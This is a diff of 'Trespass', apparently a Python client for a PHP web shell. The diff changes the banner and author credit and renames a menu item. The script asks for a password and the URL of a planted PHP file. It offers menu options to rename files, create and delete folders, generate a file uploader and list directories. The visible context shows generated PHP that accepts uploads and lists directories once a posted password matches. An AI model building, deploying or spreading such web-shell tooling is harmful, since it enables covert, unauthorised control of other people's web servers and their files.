@@ -3,13 +3,13 @@ import requests
 
 
 #print banner
-print('''                                 _        
-   /\/\   __ _ _ __   __ _  ___ | |_ ___  
-  /    \ / _` | '_ \ / _` |/ _ \| __/ _ \ 
- / /\/\ \ (_| | | | | (_| | (_) | || (_) |
- \/    \/\__,_|_| |_|\__, |\___/ \__\___/ 
-                     |___/                                
- Trespass Author - Mangoto-TDHU - site - http://mangoto.ga - help from JetBlack''')
+print('''___________________    ___ ___  ____ ___  
+\__    ___/\______ \  /   |   \|    |   \ 
+  |    |    |    |  \/    ~    \    |   / 
+  |    |    |    `   \    Y    /    |  /  
+  |____|   /_______  /\___|_  /|______/   
+                   \/       \/                                           
+ Trespass Author - TDHU - help from JetBlack''')
 print(" ")
 pa55=input(" pass: ")
 path=input(" URL of php file: ")
@@ -23,7 +23,7 @@ treshelp=''' Choose option by number!
  5. rename file
  6. make folder
  7. delete folder
- 8. add file uploader   
+ 8. Generate file uploader   
  9. ls
  '''
 print(treshelp)
@@ -73,7 +73,6 @@ while True:
 $name = $_FILES['file']['name'];
 $tmp_name = $_FILES['file']['tmp_name'];
 $pass = $_POST['pass'];
-
 if ($pass == "''' + pa55 + '''"){
     if(isset($name)){
         $location='upload/';
@@ -149,7 +148,6 @@ if ($pass == "''' + pa55 + '''"){
 	    $ls = $_POST['ls'];
 	    $dir = opendir($ls);
 	    $item = readdir($dir);
-
 	    while(($item = readdir($dir)) !== FALSE){
 		    echo ' ';
 		    echo $item;
